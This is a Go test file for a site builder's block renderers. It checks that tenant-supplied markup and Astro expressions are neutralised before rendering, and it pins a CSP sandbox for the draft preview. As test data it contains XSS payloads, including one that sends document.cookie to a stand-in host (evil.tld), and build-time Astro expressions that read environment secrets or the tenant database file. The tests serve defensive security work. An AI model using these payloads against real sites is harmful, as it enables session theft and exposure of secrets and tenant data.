package builder

import (
	"encoding/json"
	"os"
	"regexp"
	"sort"
	"strings"
	"testing"

	"github.com/bright-interaction/slab/internal/store"
)

// Every block renderer is a tenant-content sink. Two of the three raw-markup
// ones (custom, raw_astro) emitted the tenant string verbatim while only
// raw_html was sanitized, and the comments in each layer named the other layer
// as the authoritative defense, so in practice neither ran.
//
// This drives the payloads through the sinks directly rather than trusting a
// per-renderer reading, so a new block type that forgets to sanitize fails
// here instead of in production.
func TestRawBlockSinksAreSanitized(t *testing.T) {
	const xss = `<script>fetch('https://evil.tld/?c='+document.cookie)</script>`

	tests := []struct {
		name   string
		render func() string
	}{
		{"custom.markup", func() string {
			return renderCustomBlock(map[string]any{"markup": xss})
		}},
		{"raw_astro.code", func() string {
			return renderRawAstroBlock(map[string]any{"code": xss})
		}},
		{"custom.markup img onerror", func() string {
			return renderCustomBlock(map[string]any{"markup": `<img src=x onerror=alert(1)>`})
		}},
		{"raw_astro.code iframe srcdoc", func() string {
			return renderRawAstroBlock(map[string]any{"code": `<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>`})
		}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			out := tt.render()
			low := strings.ToLower(out)
			for _, bad := range []string{"<script", "onerror=", "srcdoc="} {
				if strings.Contains(low, bad) {
					t.Errorf("%s survived into rendered output: %q", bad, out)
				}
			}
		})
	}
}

// ---------------------------------------------------------------------------
// The component-template sink.
//
// TestRawBlockSinksAreSanitized above hand-lists custom and raw_astro. The
// registered-component sink is not on that list, and that omission is the
// whole defect: renderRegisteredComponentInline emits a stored template body
// verbatim into the draft-preview document, and a write-scoped agent key can
// store that template.
//
// It is NOT fixed by sanitizing. A registered component IS Astro source, so
// its <style> and <script> are the feature, locked in by
// draft_preview_inline_test.go. Running it through rawHTMLPolicy would strip
// the script and break the animation the preview exists to show. The honest
// statement of the contract is therefore the opposite of the other sinks:
// this one is trusted-by-design at the markup layer, and its containment is
// the response-level sandbox CSP in handlers.DraftPreviewCSP.
//
// So the guard below asserts the property that actually holds, and pins the
// reason, rather than asserting a sanitization that would be a lie.
// ---------------------------------------------------------------------------

// TestComponentTemplateSinkIsDeliberatelyRawAndDocumentedAsSuch pins that the
// component-template sink emits script verbatim BY DESIGN. If someone later
// makes it sanitize, this test fails and forces them to notice they are
// breaking the animation feature rather than discovering it in production.
// If someone instead removes the CSP that contains it, the handlers-side
// guard fails. Between the two, the sink cannot silently become unsafe.
func TestComponentTemplateSinkIsDeliberatelyRawAndDocumentedAsSuch(t *testing.T) {
	const tpl = `---
const { label } = Astro.props;
---
<section><p>{label}</p><script>console.log('component animation')</script></section>
`
	got, ok := renderRegisteredComponentInline(tpl, `{"props":{"label":"hi"}}`)
	if !ok {
		t.Fatalf("renderRegisteredComponentInline returned ok=false")
	}
	if !strings.Contains(got, "<script>") {
		t.Fatalf("the component sink no longer emits <script> verbatim.\n"+
			"That is a behaviour change, not a bugfix: draft_preview_inline_test.go "+
			"requires the component animation to run in the preview. If this was "+
			"intentional, delete this test and the animation feature together.\ngot: %q", got)
	}

	// The containment this sink depends on must exist and must not have been
	// weakened to a same-origin sandbox, which would be decorative.
	//
	// builder cannot import handlers (handlers imports builder), so this reads
	// the source. It must read the CONST DECLARATION and not the whole file:
	// the first cut of this check scanned the file text, and the doc comment
	// above the constant explains the sandbox directive at length, so deleting
	// the directive from the actual policy still left the phrase in the
	// comment and the guard passed. Caught by ablating the directive and
	// watching this test stay green.
	csp := draftPreviewCSPValue(t)
	if !strings.Contains(csp, "sandbox allow-scripts") {
		t.Errorf("handlers.DraftPreviewCSP no longer sandboxes the draft preview; "+
			"the component-template sink emits agent-stored script verbatim and has "+
			"no other containment.\nconst value: %q", csp)
	}
	if strings.Contains(csp, "allow-same-origin") {
		t.Errorf("handlers.DraftPreviewCSP grants allow-same-origin, which returns the "+
			"admin origin to a document containing agent-stored script.\nconst value: %q", csp)
	}
}

// draftPreviewCSPStringRE pulls the quoted segments out of the
// `const DraftPreviewCSP = "..." + "..."` declaration, ignoring the doc
// comment above it.
var draftPreviewCSPStringRE = regexp.MustCompile(`"([^"]*)"`)

// draftPreviewCSPValue reconstructs the VALUE of handlers.DraftPreviewCSP from
// source, so this guard cannot be satisfied by prose.
func draftPreviewCSPValue(t *testing.T) string {
	t.Helper()
	src, err := os.ReadFile("../handlers/draft_preview_serve.go")
	if err != nil {
		t.Fatalf("the component sink is contained by handlers.DraftPreviewCSP, "+
			"and that file is now unreadable: %v", err)
	}
	body := string(src)
	start := strings.Index(body, "const DraftPreviewCSP =")
	if start < 0 {
		t.Fatal("const DraftPreviewCSP not found in handlers/draft_preview_serve.go; " +
			"this guard is keyed on it and has drifted")
	}
	// The declaration runs to the first line that does not continue the
	// concatenation with a trailing '+'.
	decl := body[start:]
	var b strings.Builder
	for i, line := range strings.Split(decl, "\n") {
		b.WriteString(line)
		b.WriteString("\n")
		trimmed := strings.TrimSpace(line)
		if i > 0 || !strings.HasSuffix(trimmed, "+") {
			if !strings.HasSuffix(trimmed, "+") {
				break
			}
		}
	}
	var value strings.Builder
	for _, m := range draftPreviewCSPStringRE.FindAllStringSubmatch(b.String(), -1) {
		value.WriteString(m[1])
	}
	got := value.String()
	if got == "" {
		t.Fatal("parsed an empty value for DraftPreviewCSP; the parser has drifted")
	}
	return got
}

// TestComponentTemplateSinkPropsStayEscaped is the half of this sink that IS
// a sanitization contract. The template body is trusted; the PROPS are block
// data and are not. This is the boundary the sink actually has to hold.
func TestComponentTemplateSinkPropsStayEscaped(t *testing.T) {
	const tpl = `---
const { label } = Astro.props;
---
<section><p>{label}</p></section>
`
	got, ok := renderRegisteredComponentInline(tpl, `{"props":{"label":"<script>alert(1)</script>"}}`)
	if !ok {
		t.Fatalf("renderRegisteredComponentInline returned ok=false")
	}
	if strings.Contains(got, "<script>alert(1)</script>") {
		t.Errorf("a prop value reached the preview document as live markup: %q", got)
	}
}

// raw_astro is a CODE sink, not just a markup sink: its output is written into
// a generated .astro file where `{expr}` is evaluated by Astro in Node at build
// time, with the build process environment in scope. Sanitizing HTML does not
// close that, because braces are ordinary text to an HTML sanitizer. This is
// the half that could print a server secret onto the public page, and CSP does
// not apply to build-time evaluation.
func TestRawAstroBlockNeutralisesBuildTimeExpressions(t *testing.T) {
	tests := []string{
		`<div>{process.env.LITESTREAM_SECRET_ACCESS_KEY}</div>`,
		`<div>{import.meta.env.SECRET}</div>`,
		`<span>{await fetch('https://evil.tld')}</span>`,
	}
	for _, in := range tests {
		out := renderRawAstroBlock(map[string]any{"code": in})
		if strings.Contains(out, "{") || strings.Contains(out, "}") {
			t.Errorf("a build-time expression survived in raw_astro output: %q", out)
		}
		if strings.Contains(out, "process.env") && !strings.Contains(out, "&#123;") {
			t.Errorf("process.env reference is not brace-neutralised: %q", out)
		}
	}
}

// The sanitizer must not be so aggressive that ordinary authored markup stops
// working, or authors route around the block entirely.
func TestRawBlockSinksKeepLegitimateMarkup(t *testing.T) {
	out := renderCustomBlock(map[string]any{
		"markup": `<p>Hello <strong>world</strong>, see <a href="https://example.com">this</a>.</p>`,
	})
	for _, want := range []string{"<p>", "<strong>", "world", `href="https://example.com"`} {
		if !strings.Contains(out, want) {
			t.Errorf("legitimate markup %q was stripped from: %q", want, out)
		}
	}
}

// ---------------------------------------------------------------------------
// The guard. This class has recurred three times in this package, so the tests
// below enumerate the sinks from the SOURCE rather than from what a reviewer
// remembered to list.
// ---------------------------------------------------------------------------

// astroRawFields are the data keys whose value is written into generated
// .astro output as markup rather than as escaped text. Every one of them is a
// build-time code sink, because `{...}` in .astro source is JavaScript that
// Astro evaluates in Node during the build.
var astroRawFields = []string{"markup", "code", "html"}

// astroExprPayloads are real attacks, not shapes. The first reads the
// multi-tenant SQLite file onto the attacker's own published page; the second
// prints a build-environment secret. Neither needs a single character that an
// HTML sanitizer has any reason to touch.
var astroExprPayloads = []string{
	`<b>{(await import('node:fs')).readFileSync('/app/data/atomicsite.db','utf8')}</b>`,
	`<p>hello {process.env.LITESTREAM_SECRET_ACCESS_KEY} world</p>`,
}

// liveAstroExpressions are fragments that can only exist if a tenant-supplied
// brace reached the .astro source unneutralised. Checking these rather than
// "the output contains no brace at all" keeps the guard honest for renderers
// that emit braces of their own (search_box ships an inline script).
var liveAstroExpressions = []string{"{(await", "{process.env", "'utf8')}", "_ACCESS_KEY}"}

// rawTextElementRE matches a <script> or <style> element and captures its body.
// Those two are raw-text elements: measured against a real Astro build, the
// compiler does not evaluate `{...}` inside them and nothing decodes an entity
// there. So the guard has to judge them by different rules than markup, and
// saying so here is what stops the next person from "fixing" JSON-LD by
// entity-encoding the braces that hold the JSON together.
var rawTextElementRE = regexp.MustCompile(`(?is)<(script|style)\b[^>]*>(.*?)</\s*(script|style)\s*>`)

func assertNoLiveAstroExpression(t *testing.T, where, out string) {
	t.Helper()

	// Rule for <script> and <style> bodies: braces are fine, breaking out of
	// the element is not, and an HTML entity is a bug rather than a defence.
	for _, m := range rawTextElementRE.FindAllStringSubmatch(out, -1) {
		body := m[2]
		low := strings.ToLower(body)
		for _, bad := range []string{"</script", "</style", "<!--"} {
			if strings.Contains(low, bad) {
				t.Errorf("%s: %q inside a <%s> body ends the element and returns the parser to markup:\n%s", where, bad, m[1], out)
			}
		}
		for _, wrong := range []string{"&#123;", "&#125;"} {
			if strings.Contains(body, wrong) {
				t.Errorf("%s: %q inside a <%s> body is not decoded by anything, so this is broken code, not an escape:\n%s", where, wrong, m[1], out)
			}
		}
	}

	// Rule for markup context, the one place Astro evaluates braces.
	markup := rawTextElementRE.ReplaceAllString(out, "")
	for _, bad := range liveAstroExpressions {
		if strings.Contains(markup, bad) {
			t.Errorf("%s: build-time expression %q reached .astro markup:\n%s", where, bad, out)
		}
	}
	// If the payload survived at all it has to be there in neutralised form, so
	// a renderer cannot pass by dropping the field instead of sanitizing it and
	// then quietly start emitting it again later.
	if strings.Contains(markup, "readFileSync") || strings.Contains(markup, "LITESTREAM") {
		if !strings.Contains(markup, "&#123;") {
			t.Errorf("%s: payload survived but carries no neutralised brace:\n%s", where, out)
		}
	}
}

// renderDataBlockCaseTypes reads the block types out of renderDataBlock's
// switch in pages.go, so a new block type joins this guard the moment it is
// added rather than when somebody remembers to add it.
func renderDataBlockCaseTypes(t *testing.T) []string {
	t.Helper()
	src, err := os.ReadFile("pages.go")
	if err != nil {
		t.Fatalf("read pages.go: %v", err)
	}
	body := string(src)
	start := strings.Index(body, "func renderDataBlock(")
	if start < 0 {
		t.Fatal("renderDataBlock not found in pages.go; this guard is keyed on it")
	}
	end := strings.Index(body[start:], "\n}\n")
	if end < 0 {
		t.Fatal("could not find the end of renderDataBlock")
	}
	caseRE := regexp.MustCompile(`case "([a-z0-9_]+)":`)
	var types []string
	for _, m := range caseRE.FindAllStringSubmatch(body[start:start+end], -1) {
		types = append(types, m[1])
	}
	if len(types) < 20 {
		t.Fatalf("only %d block types parsed out of renderDataBlock; the parser has drifted", len(types))
	}
	return types
}

// blockDataKeyREs harvest, from the package source, every key a renderer reads
// out of a block's data map. The first cut of this guard covered three fields
// by name, which is how it missed that escapeHTML leaves braces alone and
// therefore that an ordinary heading was the same code sink as a raw-markup
// block. Reading the keys out of the source means a field added tomorrow is
// covered tomorrow.
// The leading underscore matters: the store and locale blocks read their real
// content from _resolved_product / _resolved_locales, which the resolver puts
// into the same map, and leaving those out made this guard vacuous for two
// block types while still reporting them as covered.
var blockDataKeyREs = []*regexp.Regexp{
	regexp.MustCompile(`dataString\([A-Za-z_][A-Za-z0-9_]*, "([a-z_][a-z0-9_]*)"\)`),
	regexp.MustCompile(`[a-z][A-Za-z0-9_]*\["([a-z_][a-z0-9_]*)"\]`),
	regexp.MustCompile(`stringField\([A-Za-z_][A-Za-z0-9_]*, "([a-z_][a-z0-9_]*)"`),
	regexp.MustCompile(`"([a-z_][a-z0-9_]*)", "[a-z_][a-z0-9_]*"\)`),
}

func harvestBlockDataFields(t *testing.T) []string {
	t.Helper()
	entries, err := os.ReadDir(".")
	if err != nil {
		t.Fatalf("read package dir: %v", err)
	}
	seen := map[string]bool{}
	for _, e := range entries {
		name := e.Name()
		if e.IsDir() || !strings.HasSuffix(name, ".go") || strings.HasSuffix(name, "_test.go") {
			continue
		}
		src, err := os.ReadFile(name)
		if err != nil {
			t.Fatalf("read %s: %v", name, err)
		}
		for _, re := range blockDataKeyREs {
			for _, m := range re.FindAllStringSubmatch(string(src), -1) {
				seen[m[1]] = true
			}
		}
	}
	fields := make([]string, 0, len(seen))
	for f := range seen {
		fields = append(fields, f)
	}
	sort.Strings(fields)
	if len(fields) < 50 {
		t.Fatalf("only %d data fields harvested from the package source; the harvester has drifted", len(fields))
	}
	return fields
}

// TestEveryBlockTypeIsAstroExpressionSafe walks renderDataBlock's switch and
// pushes a real build-time expression through EVERY data field of every block
// type, not only the raw-markup ones. Three shapes, because a renderer that
// bails when its list is empty would otherwise never reach its own text fields:
//
//	A  every field a string
//	B  every field a list of items whose every field is a string
//	C  one field a string at a time, every other field a list
//
// Fields come from the source, types come from the switch, so neither list is a
// thing a reviewer has to remember to update.
func TestEveryBlockTypeIsAstroExpressionSafe(t *testing.T) {
	types := append(renderDataBlockCaseTypes(t), "some_block_type_that_does_not_exist")
	fields := harvestBlockDataFields(t)

	for _, bt := range types {
		for _, payload := range astroExprPayloads {
			strs := make(map[string]any, len(fields))
			for _, f := range fields {
				strs[f] = payload
			}
			assertNoLiveAstroExpression(t, "A "+bt, renderDataBlock(bt, strs, nil, "site-1"))

			item := make(map[string]any, len(fields))
			for _, f := range fields {
				item[f] = payload
			}
			lists := make(map[string]any, len(fields))
			for _, f := range fields {
				lists[f] = []any{item, item}
			}
			assertNoLiveAstroExpression(t, "B "+bt, renderDataBlock(bt, lists, nil, "site-1"))

			// D: every field a map. The product block resolves its content
			// into _resolved_product as a map, so neither A nor B reaches it.
			maps := make(map[string]any, len(fields))
			for _, f := range fields {
				maps[f] = item
			}
			assertNoLiveAstroExpression(t, "D "+bt, renderDataBlock(bt, maps, nil, "site-1"))

			for _, target := range fields {
				mixed := make(map[string]any, len(fields))
				for _, f := range fields {
					mixed[f] = []any{item, item}
				}
				mixed[target] = payload
				assertNoLiveAstroExpression(t, "C "+bt+"."+target, renderDataBlock(bt, mixed, nil, "site-1"))
			}
		}
	}
}

// TestRenderBlockHTMLPathIsAstroExpressionSafe covers the data.html branch in
// renderBlock, a different sink from the switch below it and the third of the
// four to be missed.
func TestRenderBlockHTMLPathIsAstroExpressionSafe(t *testing.T) {
	for _, payload := range astroExprPayloads {
		data, err := json.Marshal(map[string]any{"html": payload})
		if err != nil {
			t.Fatal(err)
		}
		bl := store.Block{ID: "b1", BlockType: "custom", DataJson: string(data)}
		assertNoLiveAstroExpression(t, "renderBlock data.html", renderBlock(bl, nil, nil, "site-1"))
	}
}

// TestGlobalBlockPathIsAstroExpressionSafe covers the fourth sink. A global
// block renders into Base.astro, so it is the header or footer of every page,
// and it had no sanitizer of any kind.
func TestGlobalBlockPathIsAstroExpressionSafe(t *testing.T) {
	for _, slot := range []string{"header", "footer"} {
		for _, payload := range astroExprPayloads {
			data, err := json.Marshal(map[string]any{"html": payload})
			if err != nil {
				t.Fatal(err)
			}
			gb := store.GlobalBlock{ID: "g1", Slot: slot, BlockType: slot, DataJson: string(data)}
			assertNoLiveAstroExpression(t, "extractHTMLFromGlobalBlock("+slot+")", extractHTMLFromGlobalBlock(gb))
			assertNoLiveAstroExpression(t, "ExtractHTMLFromGlobalBlock("+slot+")", ExtractHTMLFromGlobalBlock(gb))
		}
	}
}

// TestRawSinksUseTheSharedAstroHelper is the structural half. Output tests only
// catch the sinks somebody thought to test; this one fails when a renderer
// reaches for the markup-only sanitizer, which is exactly how three of the four
// sinks got the markup half of the defence and missed the code half.
func TestRawSinksUseTheSharedAstroHelper(t *testing.T) {
	entries, err := os.ReadDir(".")
	if err != nil {
		t.Fatalf("read package dir: %v", err)
	}
	forbidden := []string{"sanitizeRawHTML(", "neutraliseAstroExpressions(", "customBlockPolicy.Sanitize("}
	for _, e := range entries {
		name := e.Name()
		if e.IsDir() || !strings.HasSuffix(name, ".go") || strings.HasSuffix(name, "_test.go") || name == "sanitize.go" {
			continue
		}
		src, err := os.ReadFile(name)
		if err != nil {
			t.Fatalf("read %s: %v", name, err)
		}
		for _, bad := range forbidden {
			if strings.Contains(string(src), bad) {
				t.Errorf("%s calls %s directly; a raw sink must route through sanitizeForAstro or sanitizeCustomBlockForAstro", name, bad)
			}
		}
	}
}
